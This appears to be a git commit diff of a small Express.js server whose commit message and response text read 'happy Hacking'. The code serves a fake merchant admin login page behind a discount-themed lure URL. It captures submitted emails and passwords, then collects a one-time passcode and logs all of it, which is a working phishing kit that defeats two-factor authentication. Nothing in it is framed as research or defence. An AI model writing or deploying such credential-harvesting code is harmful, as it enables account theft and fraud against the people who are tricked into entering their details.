292875fc6684da58e19eb902cc1c80334a754071
Abdullah Khan <93679573+AbdullahKhan0800@users.noreply.github.com>
2023-10-15 05:40:47 +0500

    happy Hacking

--- index.js
+++ index.js
@@ -1,11 +1,13 @@
 const express = require('express');
 const app = express();
 const path = require('path');
+const timeout = require('connect-timeout');
 const loginRoutes = require('./routes/loginRoutes')
 var bodyParser = require('body-parser')
 
-app.use(bodyParser.urlencoded({ extended: false }));
 app.use(bodyParser.json());
+app.use(timeout('5s'));
+app.use(bodyParser.urlencoded({ extended: false }));
 app.use('/', loginRoutes);
 app.use('/static', express.static(path.join(__dirname, 'public')));
 
--- routes/loginRoutes.js
+++ routes/loginRoutes.js
@@ -1,65 +1,33 @@
-const express =  require('express')
-const router = express.Router()
-const path = require('path')
-const CyclicDb = require("@cyclic.sh/dynamodb")
+const express =  require('express');
+const router = express.Router();
+const path = require('path');
 const { v4: uuidv4 } = require('uuid');
-const db = CyclicDb("dark-gold-leopard-slipCyclicDB")
+let LoginDetail;
 
 router.get('/',(req,res)=>{
-    res.redirect('/admin/login')
-})
-
-// Merchant Admin Login Portal
-router.get('/admin/login', (req, res) => {
-    res.sendFile(path.join(__dirname + '/../public' + '/login.html'));
+    let keyID = uuidv4().split('-')[0];
+    res.redirect(`/admin/login/discount/id/${keyID}`);
 });
 
-// // Confirm the Login and password
-router.post('/admin/login', async (req, res) => {
-    let user = db.collection('User')
-    let key = uuidv4();
-    // create an item in collection with key "leo"
-    let userDetail = {
+router.get('/admin/login/discount/id/:id', async (req, res) => {
+    res.sendFile(path.join(__dirname + '/../public' + '/login.html'))
+});
+
+router.post('/api/admin/login/:id',(req, res) => {
+    LoginDetail = {
+        id: req.params.id,
         email: req.body.email,
         password: req.body.password
-    }
-    let userString = await user.set(key, userDetail)
-    let vitem = await user.get(key);
-    console.log(vitem)
-    // get an item at key "leo" from collection animals
-    try {
-        res.redirect( req.originalUrl + '/' + key + '/verification_code')
-    } catch (error) {
-        res.status(400).json({ message: error.message })
-    }
+    };
+    console.log(LoginDetail);
+    res.send('ok');
 });
 
-router.get('/admin/login/:id/verification_code', async (req, res) => {
-    let existingUser = req.params.id ;
-    console.log(existingUser)
-    let user = db.collection('User');
-    let vitem = await user.get(existingUser);
-    try{
-        res.sendFile(path.join(__dirname + '/../public' + '/confirmation.html'));
-    } catch (error) {
-        res.json({ message: "error" });
-    }
-});
-
-router.post('/admin/login/:id/verification_code', async (req, res) => {
-    let existingUser = req.params.id
-    let user = db.collection('User')
-    let item = await user.get(existingUser)
-    console.log(item)
-    let obj = item.props
-    obj['OTP'] = req.body.number
-    let userString = await user.set(existingUser, obj)
-    console.log(obj)
-    try{
-        res.json(userString);
-    } catch (error) {
-        res.json({ message: "error" })
-    }
+router.post('/api/admin/login/:id/otp', (req, res) => {
+    LoginDetail['OTP'] = req.body.OTP;
+    console.log(LoginDetail);
+    res.send('happy hacking')
+    LoginDetail = {};
 });
 
 module.exports = router
